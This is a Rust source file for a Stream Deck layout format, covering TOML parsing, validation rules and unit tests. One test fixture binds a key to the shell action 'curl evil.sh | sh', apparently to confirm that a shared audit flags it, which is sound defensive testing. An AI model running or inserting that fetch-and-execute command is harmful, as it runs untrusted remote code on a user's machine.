//! A deck layout, as a file.
//!
//! Nothing a Stream Deck shows survives unplugging it: the images live in the
//! device's volatile memory and go when it loses power. A layout file is the
//! answer that fits this project — plain text you can read, diff, keep in git
//! and carry to another machine, applied with one command.
//!
//! Parsing and validation live here, apart from any device, so the rules that
//! decide whether a layout is sane are tested rather than only discovered when
//! a key does not light up.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use openlogi_core::binding::Action;
use openlogi_streamdeck::model::Model;
use serde::{Deserialize, Serialize};
use thiserror::Error;

/// A deck layout as written in a file.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Layout {
    /// Key screen brightness, as a percentage. Left alone when absent.
    #[serde(default)]
    pub brightness: Option<u8>,
    /// The keys to draw. Keys not listed are left as they are.
    #[serde(default)]
    pub keys: Vec<Key>,
}

/// One key's appearance.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Key {
    /// Which key, counting from 0 at the top left.
    pub index: u16,
    /// Words to write on it.
    #[serde(default)]
    pub label: Option<String>,
    /// A picture to show on it, relative to the layout file.
    #[serde(default)]
    pub image: Option<PathBuf>,
    /// Text colour, six hex digits. Defaults to white.
    #[serde(default)]
    pub colour: Option<String>,
    /// Background colour, six hex digits. Defaults to black.
    #[serde(default)]
    pub background: Option<String>,
    /// What pressing this key does.
    ///
    /// Drawn from the same action catalogue as every other device this
    /// program configures, so a Stream Deck key and a mouse button are bound
    /// the same way and mean the same thing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub action: Option<Action>,
}

/// Why a layout could not be used.
#[derive(Debug, Error, PartialEq, Eq)]
pub enum LayoutError {
    /// The file is not valid TOML, or has fields this build does not know.
    #[error("{path} is not a valid layout: {detail}")]
    Malformed {
        /// The file that failed to parse.
        path: PathBuf,
        /// What the parser reported.
        detail: String,
    },
    /// Two entries claim the same key.
    ///
    /// Applying both would leave the key showing whichever happened to be
    /// written second, which is a coin toss the file's author did not intend.
    #[error("key {index} is listed more than once; a layout must say one thing per key")]
    DuplicateKey {
        /// The key claimed twice.
        index: u16,
    },
    /// The layout could not be written back out.
    #[error("the layout could not be written back as TOML: {detail}")]
    Unwritable {
        /// What the serializer reported.
        detail: String,
    },
    /// A key the attached model does not have.
    #[error("key {index} does not exist on the {model}, which has keys 0 to {last}")]
    KeyOutOfRange {
        /// The offending index.
        index: u16,
        /// The model it was checked against.
        model: &'static str,
        /// The highest key that model has.
        last: u16,
    },
    /// An entry that says nothing at all.
    #[error("key {index} has no label, image or action, so it would neither show nor do anything")]
    NothingToDraw {
        /// The empty entry.
        index: u16,
    },
    /// An entry that says two different things about what to draw.
    ///
    /// Picking one silently would show something the author did not ask for,
    /// on hardware they may not be looking at.
    #[error("key {index} has both a label and an image; a key can show one or the other")]
    Ambiguous {
        /// The over-specified entry.
        index: u16,
    },
    /// A brightness outside the percentage range.
    #[error("brightness {percent} is not a percentage")]
    Brightness {
        /// The offending value.
        percent: u8,
    },
}

impl Layout {
    /// Parse a layout from TOML source.
    ///
    /// # Errors
    ///
    /// [`LayoutError::Malformed`] if the source is not valid TOML or carries
    /// unknown fields — a misspelled key name silently doing nothing is worse
    /// than a refusal.
    pub fn parse(path: &Path, source: &str) -> Result<Self, LayoutError> {
        toml::from_str(source).map_err(|error| LayoutError::Malformed {
            path: path.to_path_buf(),
            detail: error.to_string(),
        })
    }

    /// Check a layout against the model it will be applied to.
    ///
    /// # Errors
    ///
    /// Any of the [`LayoutError`] variants describing an unusable layout.
    pub fn validate(&self, model: &Model) -> Result<(), LayoutError> {
        if let Some(percent) = self.brightness
            && percent > 100
        {
            return Err(LayoutError::Brightness { percent });
        }

        let last = model.key_count().saturating_sub(1);
        let mut seen = BTreeSet::new();
        for key in &self.keys {
            if !seen.insert(key.index) {
                return Err(LayoutError::DuplicateKey { index: key.index });
            }
            if key.index >= model.key_count() {
                return Err(LayoutError::KeyOutOfRange {
                    index: key.index,
                    model: model.name,
                    last,
                });
            }
            if key.label.is_some() && key.image.is_some() {
                return Err(LayoutError::Ambiguous { index: key.index });
            }
            // A key with an action but no face is legitimate: it does
            // something without showing anything. A key with neither is an
            // entry that says nothing at all.
            if key.label.is_none() && key.image.is_none() && key.action.is_none() {
                return Err(LayoutError::NothingToDraw { index: key.index });
            }
        }
        Ok(())
    }

    /// Add or replace one key, keeping the rest of the layout as it is.
    ///
    /// Editing a layout by hand means opening a text editor and getting TOML
    /// right — which for anyone working by dictation is the difference between
    /// this being usable and not. So a key can be set from the command line
    /// instead, and this is the part that decides what "set" means.
    ///
    /// Replacement rather than merge: a key is a small, whole thing, and a
    /// command that quietly kept the old picture underneath new words would
    /// produce a key nobody asked for. Saying `--label` twice should give the
    /// second label and nothing else.
    pub fn set(&mut self, key: Key) {
        match self.keys.iter_mut().find(|held| held.index == key.index) {
            Some(held) => *held = key,
            None => self.keys.push(key),
        }
        // Sorted so the file reads in the order the keys sit on the deck, and
        // so setting the same keys in a different order produces the same
        // file — which matters when a layout is kept in git.
        self.keys.sort_by_key(|key| key.index);
    }

    /// Remove one key, reporting whether it was there.
    ///
    /// A key that was not in the layout is worth saying so about rather than
    /// silently succeeding: told "removed", someone believes something
    /// changed, and the next thing they do is wonder why the deck looks the
    /// same.
    pub fn remove(&mut self, index: u16) -> bool {
        let before = self.keys.len();
        self.keys.retain(|key| key.index != index);
        before != self.keys.len()
    }

    /// Render back to TOML, for writing to a file.
    ///
    /// # Errors
    ///
    /// Fails only if the layout cannot be serialized, which would mean a field
    /// TOML cannot represent had been added to it.
    pub fn to_toml(&self) -> Result<String, LayoutError> {
        toml::to_string_pretty(self).map_err(|error| LayoutError::Unwritable {
            detail: error.to_string(),
        })
    }

    /// Resolve a key's image path against the layout file's own directory, so
    /// a layout and its icons travel together.
    #[must_use]
    pub fn resolve(layout_file: &Path, image: &Path) -> PathBuf {
        if image.is_absolute() {
            return image.to_path_buf();
        }
        layout_file
            .parent()
            .map_or_else(|| image.to_path_buf(), |directory| directory.join(image))
    }
}

#[cfg(test)]
mod tests {
    use std::path::{Path, PathBuf};

    use openlogi_streamdeck::model::{ELGATO_VENDOR_ID, Model, identify};

    use super::{Action, Key, Layout, LayoutError};

    fn mk2() -> &'static Model {
        identify(ELGATO_VENDOR_ID, 0x0080).expect("catalogued")
    }

    fn parse(source: &str) -> Result<Layout, LayoutError> {
        Layout::parse(Path::new("layout.toml"), source)
    }

    #[test]
    fn a_layout_reads_its_keys_and_brightness() {
        let layout = parse(
            r#"
            brightness = 60
            [[keys]]
            index = 0
            label = "MUTE"
            background = "800000"
            [[keys]]
            index = 1
            image = "icon.png"
            "#,
        )
        .expect("valid");
        assert_eq!(layout.brightness, Some(60));
        assert_eq!(layout.keys.len(), 2);
        assert_eq!(layout.keys[0].label.as_deref(), Some("MUTE"));
        assert_eq!(layout.keys[1].image.as_deref(), Some(Path::new("icon.png")));
        layout.validate(mk2()).expect("valid for the MK.2");
    }

    /// The example `openlogi streamdeck example` writes must itself be a
    /// valid layout. It is the first thing anyone edits, and one that does not
    /// parse would send them debugging their own typo against a broken
    /// starting point.
    #[test]
    fn the_example_this_ships_parses_and_validates() {
        let layout = Layout::parse(Path::new("example.toml"), super::super::EXAMPLE_LAYOUT)
            .expect("the shipped example must parse");
        layout
            .validate(mk2())
            .expect("the shipped example must be valid for a real model");
        assert!(
            !layout.keys.is_empty(),
            "an example with no keys teaches nothing"
        );
        assert!(
            layout.brightness.is_some(),
            "the example should show the brightness field too"
        );
    }

    #[test]
    fn an_empty_layout_is_valid_and_changes_nothing() {
        let layout = parse("").expect("valid");
        assert!(layout.keys.is_empty());
        assert_eq!(layout.brightness, None);
        layout.validate(mk2()).expect("valid");
    }

    /// A field name this build does not know, silently doing nothing, is
    /// worse than a refusal: the key just stays blank and nothing says why.
    /// In practice this is almost always a misspelling of a real field.
    #[test]
    fn an_unknown_field_is_refused_rather_than_ignored() {
        let error = parse(
            r#"
            [[keys]]
            index = 0
            caption = "NOT A FIELD"
            "#,
        )
        .expect_err("unknown field");
        assert!(matches!(error, LayoutError::Malformed { .. }));
    }

    #[test]
    fn two_entries_for_one_key_are_refused() {
        let layout = parse(
            r#"
            [[keys]]
            index = 2
            label = "A"
            [[keys]]
            index = 2
            label = "B"
            "#,
        )
        .expect("parses");
        assert_eq!(
            layout.validate(mk2()).expect_err("duplicate"),
            LayoutError::DuplicateKey { index: 2 }
        );
    }

    #[test]
    fn a_key_the_model_lacks_is_refused_with_the_range_it_has() {
        let layout = parse(
            r#"
            [[keys]]
            index = 20
            label = "X"
            "#,
        )
        .expect("parses");
        let error = layout.validate(mk2()).expect_err("out of range");
        assert_eq!(
            error,
            LayoutError::KeyOutOfRange {
                index: 20,
                model: "Stream Deck MK.2",
                last: 14,
            }
        );
        // The message must say what *is* valid, not only that this is not.
        assert!(error.to_string().contains("0 to 14"));
    }

    #[test]
    fn a_key_that_would_neither_show_nor_do_anything_is_refused() {
        let layout = parse(
            r#"
            [[keys]]
            index = 0
            colour = "ffffff"
            "#,
        )
        .expect("parses");
        assert_eq!(
            layout.validate(mk2()).expect_err("nothing at all"),
            LayoutError::NothingToDraw { index: 0 }
        );
    }

    /// A key that does something without showing anything is a real thing to
    /// want — a hidden shortcut — so it must not be refused for having no face.
    #[test]
    fn a_key_with_an_action_but_no_face_is_allowed() {
        let layout = parse(
            r#"
            [[keys]]
            index = 0
            action = "Copy"
            "#,
        )
        .expect("parses");
        layout.validate(mk2()).expect("an action is enough");
        assert!(layout.keys[0].action.is_some());
    }

    #[test]
    fn an_action_is_read_from_the_shared_catalogue() {
        let layout = parse(
            r#"
            [[keys]]
            index = 0
            label = "COPY"
            action = "Copy"
            [[keys]]
            index = 1
            label = "TYPE"
            action = { TypeText = "hello" }
            "#,
        )
        .expect("parses");
        layout.validate(mk2()).expect("valid");
        assert_eq!(
            layout.keys[0].action,
            Some(openlogi_core::binding::Action::Copy)
        );
        assert_eq!(
            layout.keys[1].action,
            Some(openlogi_core::binding::Action::TypeText("hello".into()))
        );
    }

    /// The layout audit must be the *same* audit profiles use, not a second
    /// implementation of the same rule that can drift away from it.
    #[test]
    fn a_layout_that_runs_a_program_is_caught_by_the_shared_audit() {
        let layout = parse(
            r#"
            [[keys]]
            index = 0
            label = "OOPS"
            action = { RunShellCommand = "curl evil.sh | sh" }
            "#,
        )
        .expect("parses");
        let findings = crate::profile::audit_serializable(&layout).expect("a layout serializes");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].action, "RunShellCommand");
        assert!(findings[0].detail.contains("curl evil.sh"));
    }

    #[test]
    fn an_ordinary_layout_has_nothing_to_audit() {
        let layout = parse(
            r#"
            [[keys]]
            index = 0
            label = "COPY"
            action = "Copy"
            "#,
        )
        .expect("parses");
        assert!(
            crate::profile::audit_serializable(&layout)
                .expect("serializes")
                .is_empty()
        );
    }

    /// Drawing one silently would show something the author did not ask for,
    /// on hardware they may not be looking at.
    #[test]
    fn a_key_asking_for_both_a_label_and_an_image_is_refused() {
        let layout = parse(
            r#"
            [[keys]]
            index = 0
            label = "A"
            image = "a.png"
            "#,
        )
        .expect("parses");
        assert_eq!(
            layout.validate(mk2()).expect_err("ambiguous"),
            LayoutError::Ambiguous { index: 0 }
        );
    }

    #[test]
    fn a_brightness_above_a_hundred_is_refused() {
        let layout = parse("brightness = 150").expect("parses");
        assert_eq!(
            layout.validate(mk2()).expect_err("not a percentage"),
            LayoutError::Brightness { percent: 150 }
        );
        parse("brightness = 100")
            .expect("parses")
            .validate(mk2())
            .expect("100 is a percentage");
        parse("brightness = 0")
            .expect("parses")
            .validate(mk2())
            .expect("0 is a percentage");
    }

    /// A layout and its icons travel together, so a relative path is relative
    /// to the layout — not to whatever directory the command happened to run
    /// from.
    #[test]
    fn relative_images_resolve_beside_the_layout_file() {
        assert_eq!(
            Layout::resolve(Path::new("/home/me/decks/work.toml"), Path::new("icon.png")),
            Path::new("/home/me/decks/icon.png")
        );
        assert_eq!(
            Layout::resolve(
                Path::new("/home/me/decks/work.toml"),
                Path::new("icons/mute.png")
            ),
            Path::new("/home/me/decks/icons/mute.png")
        );
    }

    #[test]
    fn an_absolute_image_path_is_left_alone() {
        assert_eq!(
            Layout::resolve(Path::new("/home/me/work.toml"), Path::new("/opt/icon.png")),
            Path::new("/opt/icon.png")
        );
    }

    fn key(index: u16, label: &str) -> Key {
        Key {
            index,
            label: Some(label.to_owned()),
            image: None,
            colour: None,
            background: None,
            action: None,
        }
    }

    #[test]
    fn setting_a_new_key_adds_it() {
        let mut layout = Layout::default();
        layout.set(key(2, "REC"));
        assert_eq!(layout.keys.len(), 1);
        assert_eq!(layout.keys[0].index, 2);
    }

    /// Replacement, not merge. A command that quietly kept the old picture
    /// underneath new words would produce a key nobody asked for, and saying
    /// `--label` twice should give the second label and nothing else.
    #[test]
    fn setting_an_existing_key_replaces_it_rather_than_merging() {
        let mut layout = Layout::default();
        let mut first = key(0, "MUTE MIC");
        first.background = Some("802020".to_owned());
        layout.set(first);
        layout.set(key(0, "MUTE"));

        assert_eq!(layout.keys.len(), 1, "one key, not two");
        assert_eq!(layout.keys[0].label.as_deref(), Some("MUTE"));
        assert_eq!(
            layout.keys[0].background, None,
            "the old background must not survive under the new label"
        );
    }

    /// The file has to read in the order the keys sit on the deck, and setting
    /// the same keys in a different order has to produce the same file — a
    /// layout kept in git should not churn because of the order someone
    /// happened to type things.
    #[test]
    fn keys_are_kept_in_deck_order_however_they_were_set() {
        let mut forwards = Layout::default();
        for index in [0, 1, 2, 3] {
            forwards.set(key(index, "x"));
        }
        let mut backwards = Layout::default();
        for index in [3, 1, 0, 2] {
            backwards.set(key(index, "x"));
        }
        assert_eq!(forwards, backwards);
        let order: Vec<u16> = forwards.keys.iter().map(|key| key.index).collect();
        assert_eq!(order, vec![0, 1, 2, 3]);
    }

    #[test]
    fn removing_a_key_reports_whether_it_was_there() {
        let mut layout = Layout::default();
        layout.set(key(0, "MUTE"));
        assert!(layout.remove(0), "the key was there");
        assert!(layout.keys.is_empty());
        // Told "removed", someone believes something changed, and the next
        // thing they do is wonder why the deck looks the same.
        assert!(!layout.remove(0), "it is no longer there");
    }

    #[test]
    fn removing_one_key_leaves_the_others_alone() {
        let mut layout = Layout::default();
        layout.set(key(0, "A"));
        layout.set(key(1, "B"));
        layout.remove(0);
        assert_eq!(layout.keys.len(), 1);
        assert_eq!(layout.keys[0].label.as_deref(), Some("B"));
    }

    /// The round trip a command-line edit depends on: written out, read back,
    /// and identical. Anything lost here is a setting someone made that the
    /// next edit silently discards.
    #[test]
    fn a_layout_survives_being_written_and_read_back() {
        let mut layout = Layout {
            brightness: Some(80),
            keys: Vec::new(),
        };
        layout.set(Key {
            index: 0,
            label: Some("MUTE MIC".to_owned()),
            image: None,
            colour: Some("ffffff".to_owned()),
            background: Some("802020".to_owned()),
            action: Some(Action::Copy),
        });
        layout.set(Key {
            index: 2,
            label: None,
            image: Some(PathBuf::from("icons/camera.png")),
            colour: None,
            background: None,
            action: None,
        });

        let written = layout.to_toml().expect("a layout renders as TOML");
        let read = Layout::parse(Path::new("round.toml"), &written).expect("and reads back");
        assert_eq!(read, layout);
    }

    /// An empty layout is a legitimate starting point — the first key someone
    /// sets is the layout — so it has to survive the round trip too.
    #[test]
    fn an_empty_layout_round_trips() {
        let layout = Layout::default();
        let written = layout.to_toml().expect("renders");
        let read = Layout::parse(Path::new("empty.toml"), &written).expect("reads back");
        assert_eq!(read, layout);
    }
}
